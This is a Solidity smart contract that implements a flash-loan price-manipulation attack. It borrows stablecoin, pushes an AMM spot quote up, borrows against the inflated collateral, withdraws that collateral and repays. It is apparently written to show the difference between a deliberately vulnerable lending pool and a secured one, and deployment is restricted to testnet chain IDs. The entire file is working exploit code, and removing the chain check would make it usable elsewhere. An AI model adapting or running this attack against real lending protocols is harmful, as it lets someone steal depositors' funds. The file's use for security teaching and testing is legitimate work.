// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IAttackAmm {
    function getSwapQuote(uint256 amountIn, address tokenIn) external view returns (uint256);
    function swap(uint256 amountIn, uint256 minAmountOut, address tokenIn, address to) external returns (uint256);
}

interface IAttackPool {
    function flashLoan(address receiver, uint256 amount, bytes calldata data) external;
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
    function withdrawCollateral(uint256 amount) external;
    function getCollateralPrice() external view returns (uint256);
}

/// @title FlashLoanAttacker
/// @notice Testnet-only attack helper: flash-borrows stablecoin, distorts an AMM spot quote,
///         borrows against the inflated collateral value, withdraws collateral and repays.
/// @dev The exact same call against SecurePool should revert due to its guard and safety checks.
contract FlashLoanAttacker is Ownable {
    using SafeERC20 for IERC20;

    error ZeroAddress();
    error InvalidSlippage();
    error UnauthorizedCallback();
    error NoCollateralReceived();
    error UnsupportedChain();

    bytes32 public constant CALLBACK_SUCCESS = keccak256("PropChainFlashLoan.onFlashLoan");
    IERC20 public immutable loanToken;
    IERC20 public immutable collateralToken;
    IAttackAmm public immutable ammPool;
    address public activePool;
    bool private attackInProgress;

    event AttackStarted(address indexed pool, uint256 flashAmount, uint256 attemptedBorrow);
    event AttackCompleted(address indexed pool, uint256 collateralBought, uint256 borrowedAmount, uint256 collateralPriceAfterManipulation);

    constructor(address loanToken_, address collateralToken_, address ammPool_) Ownable(msg.sender) {
        if (!_supportedChain()) revert UnsupportedChain();
        if (loanToken_ == address(0) || collateralToken_ == address(0) || ammPool_ == address(0)) revert ZeroAddress();
        loanToken = IERC20(loanToken_);
        collateralToken = IERC20(collateralToken_);
        ammPool = IAttackAmm(ammPool_);
    }

    function _supportedChain() private view returns (bool) {
        uint256 id = block.chainid;
        return id == 11155111 || id == 80002 || id == 31337 || id == 1337 || id == 5777;
    }

    /// @param targetPool VulnerablePool or SecurePool address.
    /// @param flashAmount Amount of loan token to borrow temporarily.
    /// @param borrowAmount Amount to try borrowing against collateral during callback.
    /// @param slippageBps Maximum allowed quote slippage (e.g. 500 = 5%).
    function executeAttack(address targetPool, uint256 flashAmount, uint256 borrowAmount, uint16 slippageBps)
        external onlyOwner
    {
        if (targetPool == address(0)) revert ZeroAddress();
        if (slippageBps >= 10_000) revert InvalidSlippage();
        require(!attackInProgress, "attack already active");
        activePool = targetPool;
        attackInProgress = true;
        emit AttackStarted(targetPool, flashAmount, borrowAmount);
        IAttackPool(targetPool).flashLoan(address(this), flashAmount, abi.encode(borrowAmount, slippageBps));
        attackInProgress = false;
        activePool = address(0);
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata data)
        external returns (bytes32)
    {
        if (!attackInProgress || msg.sender != activePool || token != address(loanToken)) revert UnauthorizedCallback();
        (uint256 borrowAmount, uint16 slippageBps) = abi.decode(data, (uint256, uint16));

        uint256 beforeCollateral = collateralToken.balanceOf(address(this));
        loanToken.forceApprove(address(ammPool), amount);
        uint256 minCollateralOut = _minQuote(amount, address(loanToken), slippageBps);
        ammPool.swap(amount, minCollateralOut, address(loanToken), address(this));
        uint256 boughtCollateral = collateralToken.balanceOf(address(this)) - beforeCollateral;
        if (boughtCollateral == 0) revert NoCollateralReceived();

        collateralToken.forceApprove(activePool, boughtCollateral);
        IAttackPool(activePool).depositCollateral(boughtCollateral);
        uint256 manipulatedPrice = IAttackPool(activePool).getCollateralPrice();
        IAttackPool(activePool).borrow(borrowAmount);

        // This succeeds only in the intentionally vulnerable pool. The secure pool
        // enforces a current debt/collateral health check before returning collateral.
        IAttackPool(activePool).withdrawCollateral(boughtCollateral);

        collateralToken.forceApprove(address(ammPool), boughtCollateral);
        uint256 minLoanOut = _minQuote(boughtCollateral, address(collateralToken), slippageBps);
        ammPool.swap(boughtCollateral, minLoanOut, address(collateralToken), address(this));

        loanToken.safeTransfer(activePool, amount + fee);
        emit AttackCompleted(activePool, boughtCollateral, borrowAmount, manipulatedPrice);
        return CALLBACK_SUCCESS;
    }

    function withdrawToken(address token, uint256 amount, address to) external onlyOwner {
        if (to == address(0)) revert ZeroAddress();
        IERC20(token).safeTransfer(to, amount);
    }

    function _minQuote(uint256 amountIn, address tokenIn, uint16 slippageBps) private view returns (uint256) {
        uint256 quote = ammPool.getSwapQuote(amountIn, tokenIn);
        return (quote * (10_000 - slippageBps)) / 10_000;
    }
}
